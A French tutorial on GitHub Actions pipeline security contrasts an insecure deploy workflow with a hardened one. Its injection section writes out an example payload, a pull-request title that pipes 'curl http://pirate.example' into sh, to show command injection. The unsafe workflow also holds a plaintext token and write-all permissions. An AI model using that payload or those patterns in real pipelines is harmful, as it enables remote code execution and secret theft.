# Secrets et sécurité du pipeline

Un pipeline de déploiement détient les clés de la production. C'est une cible : les attaques récentes contre des chaînes de livraison passent presque toutes par une CI trop confiante.

## Le fichier dangereux, puis le fichier corrigé

Commençons par un workflow qui cumule les erreurs. Chaque commentaire nomme le problème.

```yaml
# AVANT : .github/workflows/deploy.yml
name: Deploy
on:
  pull_request_target:           # ✗ s'exécute avec les secrets sur le code d'un fork
permissions: write-all           # ✗ le jeton peut tout modifier
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Déploie ${{ github.event.pull_request.title }}"   # ✗ injection
      - run: ./deploy.sh tok_9f8e7d6c                               # ✗ secret en clair
      - uses: acme/deploy-action@main                               # ✗ branche mobile
```

Et la version corrigée. Lisez les commentaires `←` : ils disent où chaque correction se place et pourquoi.

```yaml
# APRÈS : .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]             # ← on déploie ce qui est fusionné, pas un fork
permissions:                     # ← niveau 0 : vaut pour tous les jobs
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4

      - name: Annoncer
        env:                                         # ← env appartient à l'étape : clé sœur de run
          TITLE: ${{ github.event.head_commit.message }}   # la valeur entre dans une variable
        run: echo "Déploiement de $TITLE"                  # le shell lit la variable, sans l'interpréter

      - name: Déployer
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}  # ← le secret vient des paramètres du dépôt
        run: ./deploy.sh                             # le script lit $DEPLOY_TOKEN lui-même

      - uses: acme/deploy-action@3f1d6a9c5b7e2d4a8c0f1e2d3b4a5c6d7e8f9a0b   # ← SHA complet, immuable
        with:
          token: ${{ secrets.DEPLOY_TOKEN }}         # ← paramètre de l'action : dans with
```

## Les secrets

Un **secret** se définit dans les paramètres du dépôt, jamais dans le fichier du workflow. On le lit avec `${{ secrets.DEPLOY_TOKEN }}`, de préférence dans un bloc `env:` ou `with:`. GitHub masque sa valeur dans les journaux.

Pour créer un secret : dépôt GitHub, **Settings**, **Secrets and variables**, **Actions**, **New repository secret**. Le nom (`DEPLOY_TOKEN`) est celui que vous écrirez après `secrets.`.

`env:` et `with:` ne se placent pas au même endroit selon l'usage :

- `env:` sous une étape `run:` : la valeur devient une variable d'environnement du shell.
- `with:` sous une étape `uses:` : la valeur devient un paramètre de l'action.
- `env:` au niveau du job ou du workflow : la variable est visible par toutes ses étapes. Pour un secret, préférez l'étape : moins d'étapes le voient, moins de risques.

!!Un secret écrit dans un fichier versionné est compromis dès le premier commit : changez-le, ne vous contentez pas de le supprimer!!

## Passer par env, pas par le script

Écrire `run: ./deploy.sh ${{ secrets.DEPLOY_TOKEN }}` insère la valeur dans le texte du script avant qu'il ne s'exécute. La bonne forme donne la valeur à une variable d'environnement :

```yaml
      - name: Annoncer
        env:
          TITLE: ${{ github.event.head_commit.message }}
        run: echo "Déploiement de $TITLE"
```

Dans cette étape, `name`, `env` et `run` sont trois clés **sœurs** : alignées, sous un seul tiret. `TITLE` est indenté de 2 espaces de plus que `env`, car c'est un enfant de `env`. L'ordre `env` puis `run` n'est pas obligatoire pour YAML, mais il se lit dans le bon sens : on prépare la variable, puis on l'utilise.

## L'injection de commande

Les expressions `${{ ... }}` sont remplacées **avant** l'exécution du shell. Si le titre d'une demande de fusion est `"; curl http://pirate.example | sh; "`, un `run: echo "${{ github.event.pull_request.title }}"` exécute cette commande. Les champs `title`, `body`, `head_ref` ou le message d'un commit sont contrôlés par un tiers.

Voici ce que le shell reçoit vraiment, une fois l'expression remplacée :

```bash
echo ""; curl http://pirate.example | sh; ""
```

Avec `env:`, le shell reçoit `echo "$TITLE"` : le contenu de la variable est affiché, jamais exécuté.

!!Ne mettez jamais une valeur venue de github.event directement dans un run: : passez-la par env: et lisez-la comme variable!!

## pull_request_target

Ce déclencheur lance le workflow du dépôt de base avec accès aux secrets, sur une demande venue d'un fork. Combiné à un `checkout` du code du fork, il exécute du code inconnu avec vos secrets. Pour une CI ordinaire, utilisez `pull_request`.

!!Ne combinez jamais pull_request_target avec l'exécution du code d'un fork!!

## Les actions tierces

Une action `acme/deploy-action@main` suit une branche : son auteur peut y publier du nouveau code que vous exécuterez sans l'avoir relu. Un **SHA de commit** complet (40 caractères) est immuable. Les actions officielles `actions/*` peuvent rester sur une version `@v4`.

Pour trouver le SHA : sur la page GitHub de l'action, ouvrez **Releases**, choisissez la version, puis cliquez sur le commit. Copiez les 40 caractères, et laissez un commentaire avec la version lisible :

```yaml
      - uses: acme/deploy-action@3f1d6a9c5b7e2d4a8c0f1e2d3b4a5c6d7e8f9a0b   # v2.1.0
```

## Pas à pas : sécuriser un workflow de déploiement

1. Remplacez le déclencheur `pull_request_target` par `push` sur `main` (ou par `pull_request` pour une simple CI).
2. Remplacez `permissions: write-all` par le bloc `permissions:` / `contents: read` au niveau 0.
3. Créez le secret `DEPLOY_TOKEN` dans les paramètres du dépôt, puis supprimez la valeur en clair du fichier.
4. Pour chaque `run:` qui contient `${{ secrets... }}` ou `${{ github.event... }}`, ajoutez un `env:` à la même étape, déplacez l'expression dedans, et écrivez `$NOM_DE_VARIABLE` dans le `run:`.
5. Remplacez chaque `@main` ou `@master` d'action tierce par un SHA complet, avec la version en commentaire.
6. Vérifiez avec `actionlint` : il signale les expressions dangereuses dans un `run:`.

**À retenir :** secrets dans les paramètres, passage par `env:`, jamais d'expression `github.event` dans un `run:`, éviter `pull_request_target`, actions tierces épinglées sur un SHA.
